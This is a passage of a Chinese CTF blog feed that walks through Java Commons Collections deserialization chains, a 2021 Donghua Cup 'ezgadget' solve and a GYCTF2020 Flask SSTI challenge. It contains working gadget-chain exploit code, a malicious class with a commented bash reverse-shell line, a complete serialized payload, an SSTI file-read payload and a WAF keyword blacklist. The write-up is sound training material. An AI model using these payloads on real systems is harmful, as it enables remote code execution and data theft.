class="keyword">throws</span> InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, CannotCompileException, NotFoundException, IOException &#123;</span><br><span class="line">        <span class="comment">// 利用javasist动态创建恶意字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用我们前面的恶意类也可以</span></span><br><span class="line"><span class="comment">//        byte[] classBytes = Files.readAllBytes(Paths.get(&quot;target/classes/cn/evo1/cc/Calc.class&quot;));</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="comment">// 将我的恶意类转成字节码，并且反射设置 bytecodes</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,targetByteCodes);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;asdfasdfasdf&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innermap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,templates);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) f.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f3.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashset);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC链家族"><a href="#CC链家族" class="headerlink" title="CC链家族"></a>CC链家族</h1><p>贴一张总结的图片（应该没总结错吧hhh）</p><p><img src="https://img.gejiba.com/images/2da35ecd0e1199142cb422a9d4cbc0c6.png" alt="2da35ecd0e1199142cb422a9d4cbc0c6.png"></p><h1 id="2021东华杯-ezgadget"><a href="#2021东华杯-ezgadget" class="headerlink" title="2021东华杯 ezgadget"></a>2021东华杯 ezgadget</h1><p>下载源码反编译一下，看一下逻辑</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">  <span class="meta">@ResponseBody</span></span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@ResponseBody</span></span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/readobject&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">unser</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] b = Tools.base64Decode(data);</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> objectInputStream.readUTF();</span><br><span class="line">    <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> objectInputStream.readInt();</span><br><span class="line">    <span class="keyword">if</span> (name.equals(<span class="string">&quot;gadgets&quot;</span>) &amp;&amp; year == <span class="number">2021</span>)</span><br><span class="line">      objectInputStream.readObject(); </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome bro.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在<code>readobject</code>路由，当传完一个<code>gadgets</code>和<code>2021</code>后就会触发反序列化，然后看下有没有可以用的类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToStringBean</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] ClassByte;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        org.example.tools.<span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">org</span>.example.tools.ToStringBean();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> toStringBean.defineClass((String)<span class="literal">null</span>, <span class="built_in">this</span>.ClassByte, <span class="number">0</span>, <span class="built_in">this</span>.ClassByte.length);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Obj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Obj = clazz.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;enjoy it.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>tools</code>里面存在一个<code>ToStringBean</code>类，它的<code>toString</code>方法可以加载任意字节码，所以现在思路就是找一个类来触发<code>ToStringBean.toString</code>，而在<code>CC5</code>中存在<code>BadAttributeValueExpException.readObject</code>触发<code>TiedMapEnty.toString</code>，因此最终思路是<code>BadAttributeValueExpException.readObject-&gt;ToStringBean.toString</code>，编写<code>exp</code>如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf;</span><br><span class="line"><span class="comment">// 包名记得搞对</span></span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// BadAttributeValueExpException.readObject-&gt;ToStringBean.toString</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> toStringBean.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classByte</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/com/ezgame/ctf/Payload.class&quot;</span>));</span><br><span class="line">        classByte.set(toStringBean,code);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1111</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 防止在BadAttributeValueExpException初始化的时候就调ToStringBean.toString</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">bc</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bc.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Tools.base64Encode(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line"><span class="comment">//        serialize(badAttributeValueExpException);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意类（因为我在win下起服务复现的，直接尝试弹了下计算器）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&gt;&amp;1&quot;&#125;);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终<code>payload</code>（记得<code>url编码</code>一下）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=rO0ABXcNAAdnYWRnZXRzAAAH5XNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAF3QAEmNvbS5lemdhbWUuY3RmLkV4cHQACEV4cC5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB%2BABV4c3IAIWNvbS5lemdhbWUuY3RmLnRvb2xzLlRvU3RyaW5nQmVhbhPMVFon2dx5AgABWwAJQ2xhc3NCeXRldAACW0J4cHVyAAJbQqzzF%2FgGCFTgAgAAeHAAAAKryv66vgAAADQAKAoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABhMY29tL2V6Z2FtZS9jdGYvUGF5bG9hZDsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEADFBheWxvYWQuamF2YQwACgALBwAiDAAjACQBAARjYWxjDAAlACYBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAJwEAFmNvbS9lemdhbWUvY3RmL1BheWxvYWQBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAAAgABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAUADgAAAAwAAQAAAAUADwAQAAAACAARAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAgACQAMAAwACgANAAsAFgANAA4AAAAMAAEADQAJABIAEwAAABQAAAAHAAJMBwAVCQABABYAAAACABc%3D</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Java </tag>
            
            <tag> CC链 </tag>
            
            <tag> 2021东华杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf Web 刷题记录 3</title>
      <link href="/2023/08/19/buuctf-web3/"/>
      <url>/2023/08/19/buuctf-web3/</url>
      
        <content type="html"><![CDATA[<h1 id="buuctf-Web-刷题记录-3"><a href="#buuctf-Web-刷题记录-3" class="headerlink" title="buuctf Web 刷题记录 3"></a>buuctf Web 刷题记录 3</h1><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">php反序列化从入门到放弃(入门篇)</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI（模板注入）漏洞（入门篇）</a></p></blockquote><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>观察<code>hint</code>猜测在<code>decode</code>界面可以报错，输入<code>a</code>解密即可得到<code>/app/app.py</code>部分代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure><p>掏出祖传<code>payload</code>（<code>base64</code>加密后去解密界面输入即可）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/app/app.py&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>得到源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&amp;<span class="comment">#39;SECRET_KEY&amp;#39;] = &amp;#39;s_e_c_r_e_t_k_e_y&amp;#39;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(&amp;<span class="comment">#39;BASE64加密&amp;#39;,validators= [DataRequired()])</span></span><br><span class="line">    submit = SubmitField(&amp;<span class="comment">#39;提交&amp;#39;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(&amp;<span class="comment">#39;BASE64解密&amp;#39;,validators= [DataRequired()])</span></span><br><span class="line">    submit = SubmitField(&amp;<span class="comment">#39;提交&amp;#39;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    black_list = [&amp;<span class="comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;,</span></span><br><span class="line">                  &amp;<span class="comment">#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params">&amp;<span class="comment">#39;/hint&amp;#39;,methods=[&amp;#39;GET&amp;#39;])</span></span></span></span><br><span class="line"><span class="params"><span class="meta"><span class="keyword">def</span> hint(<span class="params"></span>):</span></span></span><br><span class="line"><span class="params"><span class="meta">    txt = &amp;<span class="comment">#34;失败乃成功之母！！&amp;#34;</span></span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="keyword">return</span> render_template(<span class="params">&amp;<span class="comment">#34;hint.html&amp;#34;,txt = txt)</span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="meta"></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="meta"></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="meta">@app.route(<span class="params">&amp;<span class="comment">#39;/&amp;#39;,methods=[&amp;#39;POST&amp;#39;,&amp;#39;GET&amp;#39;])</span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="meta"><span class="keyword">def</span> encode(<span class="params"></span>):</span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="meta">    <span class="keyword">if</span> request.values.get(<span class="params">&amp;<span class="comment">#39;text&amp;#39;) :</span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        text = request.values.get(<span class="params">&amp;<span class="comment">#34;text&amp;#34;)</span></span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        text_decode = base64.b64encode(<span class="params">text.encode(<span class="params"></span>)</span>)</span></span></span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="params"><span class="params"><span class="params"><span class="meta">        tmp = &amp;<span class="comment">#34;结果  :&#123;0&#125;&amp;#34;.format(str(text_decode.decode()))</span></span></span></span></span></span></span></span><br><span 